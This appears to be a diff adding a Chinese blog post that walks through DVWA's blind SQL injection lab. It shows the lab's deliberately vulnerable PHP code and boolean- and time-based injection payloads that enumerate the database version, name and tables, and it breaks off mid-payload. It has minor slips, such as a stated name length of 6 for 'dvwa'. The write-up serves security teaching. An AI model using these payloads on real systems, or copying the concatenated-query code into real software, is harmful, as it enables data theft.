@@ -1,0 +1,951 @@
+<!DOCTYPE html>
+<html lang="en,zh-CN,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/undefined/pace/pace-theme-pace-theme-center-atom.min.css">
+  <script src="/undefined/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"caixuya.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"B5HBQCBE1B","apiKey":"ea181e93e7b10c0d94c8e758b7eb25ab","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"输入关键字","hits_empty":"没有找到与「${query}」相关的内容","hits_stats":"${hits}条相关记录，共耗时 ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是盲注（Blind SQL Injection）？盲注是一种SQL注入攻击，应用程序不直接返回数据库查询结果或错误信息，攻击者必须通过应用程序的不同响应（如页面内容、HTTP状态码、响应时间）来推断数据库信息。 与普通SQL注入的区别：    特性 普通SQL注入 盲注    错">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA - SQL Injection (Blind) 攻防练习详解">
+<meta property="og:url" content="http://caixuya.github.io/2025/11/20/SQL_Injection_Blind_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="tia的学习笔记">
+<meta property="og:description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是盲注（Blind SQL Injection）？盲注是一种SQL注入攻击，应用程序不直接返回数据库查询结果或错误信息，攻击者必须通过应用程序的不同响应（如页面内容、HTTP状态码、响应时间）来推断数据库信息。 与普通SQL注入的区别：    特性 普通SQL注入 盲注    错">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-20T15:31:37.128Z">
+<meta property="article:modified_time" content="2025-11-20T15:26:56.863Z">
+<meta property="article:author" content="caixuya">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://caixuya.github.io/2025/11/20/SQL_Injection_Blind_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DVWA - SQL Injection (Blind) 攻防练习详解 | tia的学习笔记</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="tia的学习笔记" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">tia的学习笔记</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-目录">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>目录</a>
+
+  </li>
+        <li class="menu-item menu-item-站点地图">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-开往">
+
+    <a href="/travelling/" rel="section"><i class="fa fa-paper-plane fa-fw"></i>开往</a>
+
+  </li>
+        <li class="menu-item menu-item-给我写信">
+
+    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=vY_MiY2FhI2Ojf3MzJPe0tA" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>给我写信</a>
+
+  </li>
+        <li class="menu-item menu-item-公益404">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/SQL_Injection_Blind_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="caixuya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tia的学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA - SQL Injection (Blind) 攻防练习详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:26:56" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>21k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>19 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
+<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
+<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
+<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
+<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
+</ul>
+<hr>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是盲注（Blind-SQL-Injection）？"><a href="#什么是盲注（Blind-SQL-Injection）？" class="headerlink" title="什么是盲注（Blind SQL Injection）？"></a>什么是盲注（Blind SQL Injection）？</h3><p>盲注是一种SQL注入攻击，应用程序不直接返回数据库查询结果或错误信息，攻击者必须通过应用程序的不同响应（如页面内容、HTTP状态码、响应时间）来推断数据库信息。</p>
+<p><strong>与普通SQL注入的区别：</strong></p>
+<table>
+<thead>
+<tr>
+<th>特性</th>
+<th>普通SQL注入</th>
+<th>盲注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>错误信息</td>
+<td>直接显示</td>
+<td>不显示</td>
+</tr>
+<tr>
+<td>查询结果</td>
+<td>直接返回</td>
+<td>不返回</td>
+</tr>
+<tr>
+<td>利用方式</td>
+<td>UNION查询</td>
+<td>布尔&#x2F;时间盲注</td>
+</tr>
+<tr>
+<td>攻击难度</td>
+<td>较低</td>
+<td>较高</td>
+</tr>
+<tr>
+<td>攻击速度</td>
+<td>快</td>
+<td>慢（需逐字符猜测）</td>
+</tr>
+</tbody></table>
+<p><strong>盲注的类型：</strong></p>
+<h3 id="1-布尔盲注（Boolean-based-Blind-SQL-Injection）"><a href="#1-布尔盲注（Boolean-based-Blind-SQL-Injection）" class="headerlink" title="1. 布尔盲注（Boolean-based Blind SQL Injection）"></a>1. 布尔盲注（Boolean-based Blind SQL Injection）</h3><p>通过True&#x2F;False条件判断，观察页面响应的差异：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 测试条件</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND 1=1 --   → 返回True（页面正常）</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span> <span class="comment">--   → 返回False（页面异常）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 猜测数据</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)=&#x27;</span>a<span class="string">&#x27; --</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>判断依据：</strong></p>
+<ul>
+<li>页面内容不同（如”User exists”或”User not found”）</li>
+<li>HTTP状态码不同</li>
+<li>页面长度不同</li>
+</ul>
+<h3 id="2-时间盲注（Time-based-Blind-SQL-Injection）"><a href="#2-时间盲注（Time-based-Blind-SQL-Injection）" class="headerlink" title="2. 时间盲注（Time-based Blind SQL Injection）"></a>2. 时间盲注（Time-based Blind SQL Injection）</h3><p>通过数据库延时函数，观察响应时间：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- MySQL</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SLEEP(5) --   → 延迟5秒</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, SLEEP(<span class="number">5</span>), <span class="number">0</span>) <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 猜测数据</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)=&#x27;</span>a<span class="string">&#x27;, SLEEP(5), 0) --</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>判断依据：</strong></p>
+<ul>
+<li>响应时间差异（延迟 vs 正常）</li>
+</ul>
+<p><strong>危害：</strong></p>
+<ul>
+<li>获取数据库内容（用户名、密码等）</li>
+<li>确定数据库类型和版本</li>
+<li>枚举数据库结构</li>
+<li>获取敏感配置信息</li>
+<li>完全控制数据库</li>
+</ul>
+<p><strong>DVWA场景：</strong><br>通过用户ID查询用户信息，应用只显示”User exists”或”User not found”。</p>
+<hr>
+<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完全未过滤，可进行布尔盲注和时间盲注。</p>
+<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了表单</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否存在</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接获取用户输入，无任何过滤 ★★★</span></span><br><span class="line">    <span class="comment">// $_GET[&#x27;id&#x27;] - 从URL获取id参数</span></span><br><span class="line">    <span class="comment">// trim() - 只是去除首尾空格，不做任何安全处理</span></span><br><span class="line">    <span class="comment">// mysql_real_escape_string() - 只防单引号，不够安全</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 没有参数化查询</span></span><br><span class="line">    <span class="comment">// 2. 直接拼接SQL</span></span><br><span class="line">    <span class="comment">// 3. 虽然使用了mysql_real_escape_string()，但在某些情况下仍可绕过</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接拼接SQL语句 ★★★</span></span><br><span class="line">    <span class="comment">// SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 漏洞：攻击者可以注入任意SQL代码</span></span><br><span class="line">    <span class="comment">// 例如：$id = &quot;1&#x27; AND 1=1 --&quot;</span></span><br><span class="line">    <span class="comment">// 结果：SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; AND 1=1 --&#x27;</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行SQL查询</span></span><br><span class="line">    <span class="comment">// mysql_query() - 执行MySQL查询（已弃用）</span></span><br><span class="line">    <span class="comment">// 返回结果集资源</span></span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 问题：不显示具体数据，只显示是否存在 ★★★</span></span><br><span class="line">    <span class="comment">// mysql_num_rows() - 返回结果集的行数</span></span><br><span class="line">    <span class="comment">// 这就是&quot;盲注&quot;的原因：</span></span><br><span class="line">    <span class="comment">// - 如果有结果：显示&quot;User ID exists&quot;</span></span><br><span class="line">    <span class="comment">// - 如果无结果：显示&quot;User ID not found&quot;</span></span><br><span class="line">    <span class="comment">// - 攻击者只能通过这两种响应来推断信息</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// 用户存在</span></span><br><span class="line">        <span class="comment">// ★★★ 不显示具体的first_name和last_name ★★★</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 用户不存在</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 关闭数据库连接</span></span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>HTML表单：</strong></p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">&quot;form1&quot;</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        User ID:</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">size</span>=<span class="string">&quot;15&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>直接拼接SQL</strong> - 没有使用参数化查询</li>
+<li><strong>不显示具体数据</strong> - 只返回存在&#x2F;不存在</li>
+<li><strong>显示错误信息</strong> - <code>or die(mysql_error())</code>暴露数据库信息</li>
+<li><strong>无输入验证</strong> - 接受任意输入</li>
+</ol>
+<p><strong>数据流向：</strong></p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用户输入($_GET[<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">    ↓</span><br><span class="line">直接拼接到SQL</span><br><span class="line">    ↓</span><br><span class="line">执行查询</span><br><span class="line">    ↓</span><br><span class="line">只返回<span class="literal">True</span>/<span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：测试SQL注入漏洞"><a href="#步骤1：测试SQL注入漏洞" class="headerlink" title="步骤1：测试SQL注入漏洞"></a>步骤1：测试SQL注入漏洞</h4><p><strong>测试1：基础测试</strong></p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="number">1</span>&#x27;</span><br><span class="line">结果: MySQL错误（说明有SQL注入）</span><br><span class="line"></span><br><span class="line">输入: <span class="number">1</span>&#x27; <span class="keyword">AND</span> &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">1</span></span><br><span class="line">结果: <span class="keyword">User</span> <span class="title">ID</span> exists（<span class="literal">True</span>）</span><br><span class="line"></span><br><span class="line">输入: <span class="number">1</span>&#x27; <span class="keyword">AND</span> &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">2</span></span><br><span class="line">结果: <span class="keyword">User</span> <span class="title">ID</span> not found（<span class="literal">False</span>）</span><br><span class="line"></span><br><span class="line">结论：存在布尔盲注漏洞</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤2：布尔盲注-确定数据库信息"><a href="#步骤2：布尔盲注-确定数据库信息" class="headerlink" title="步骤2：布尔盲注 - 确定数据库信息"></a>步骤2：布尔盲注 - 确定数据库信息</h4><p><strong>测试数据库版本：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 测试MySQL版本是否&gt;5</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(@@version,1,1))&gt;&#x27;</span><span class="number">5</span><span class="string">&#x27; --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">True → 版本&gt;5</span></span><br><span class="line"><span class="string">False → 版本&lt;=5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 逐字符猜测版本号</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(@<span class="variable">@version</span>,<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="string">&#x27;5&#x27;</span> <span class="comment">--</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT SUBSTRING(@@version,3,1))=&#x27;</span><span class="number">7</span><span class="string">&#x27; --</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>测试数据库名称长度：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 数据库名长度是否&gt;5</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;5 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 二分法确定长度</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> LENGTH(database())<span class="operator">&gt;</span><span class="number">10</span> <span class="comment">--  → False</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())&gt;5 --   → True</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> LENGTH(database())<span class="operator">&gt;</span><span class="number">7</span> <span class="comment">--   → False</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH(database())=6 --   → True</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">结论：数据库名长度为6</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>猜测数据库名（逐字符）：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 第一个字符</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(),1,1)=&#x27;</span>a<span class="string">&#x27; --  → False</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;b&#x27;</span> <span class="comment">--  → False</span></span><br><span class="line">...</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND SUBSTRING(database(),1,1)=&#x27;</span>d<span class="string">&#x27; --  → True</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 第二个字符</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>(database(),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;v&#x27;</span> <span class="comment">--  → True</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 继续...最终得到：dvwa</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤3：枚举数据库表"><a href="#步骤3：枚举数据库表" class="headerlink" title="步骤3：枚举数据库表"></a>步骤3：枚举数据库表</h4><p><strong>获取表名数量：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 测试表数量</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())&gt;1 --</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>获取第一个表名：</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 表名长度</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1))=9 --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 第一个字符</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">AND</span> <span class="built_in">SUBSTRING</span>((<span class="keyword">SELECT</span> table_name <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> table_schema<span class="operator">=</span>database() LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span 